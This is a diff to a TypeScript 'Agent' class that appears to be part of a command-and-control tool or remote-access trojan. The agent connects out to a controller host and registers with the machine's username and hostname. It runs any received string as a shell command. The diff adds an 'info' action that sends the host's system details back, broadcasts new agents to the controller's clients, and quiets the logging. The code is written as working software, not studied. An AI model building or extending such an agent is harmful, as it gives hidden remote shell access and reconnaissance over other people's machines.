@@ -55,11 +55,19 @@ export class Agent extends BaseSocket {
 
   public init(): void {
     super.init();
+
+    this.on('registered', () => {
+      this.ctl.clients.forEach((client) => {
+        if (!client.relay) {
+          client.send(`\n\n\tNew Agent: [${this.ctl.agents.indexOf(this)}] ${this.signature} | ${this.id}\n`);
+        }
+      });
+    });
   }
 
   public data(data: any): void {
     if (this.listener) {
-      this.log.info(`Handling data as listener: ${data}`);
+      this.log.debug(`Handling data as listener: ${data}`);
       this.handle(data.toString().trim());
     } else {
       super.data(data);
@@ -69,7 +77,7 @@ export class Agent extends BaseSocket {
   public handle(action: string): void {
     let response = '';
 
-    this.log.info(`Handle action: ${action}`);
+    this.log.debug(`Handle action: ${action}`);
 
     if (action === 'ping') {
       response = 'pong';
@@ -79,6 +87,8 @@ export class Agent extends BaseSocket {
     } else if (/rickroll/i.test(action)) {
       shell.exec(`python3 -m webbrowser "${rick}"`);
       response = `Rick is rolling ...`;
+    } else if (action === 'info') {
+      response = JSON.stringify(this.systemInfo, null, 2);
     } else {
       const res = shell.exec(action, { silent: true });
 
@@ -109,7 +119,7 @@ export class Agent extends BaseSocket {
     this.signature = `${this.systemInfo?.user.username}@${this.systemInfo?.os.hostname}`;
 
     this.socket.connect({ port: this.ctl.agentPort, host: this.ctl.host }, () => {
-      this.log.info(`Agent connected to controller`);
+      this.log.info(`Agent connected to controller: ${this.ctl.host}:${this.ctl.agentPort}`);
 
       this.write(`reg ${this.signature}`);
     });
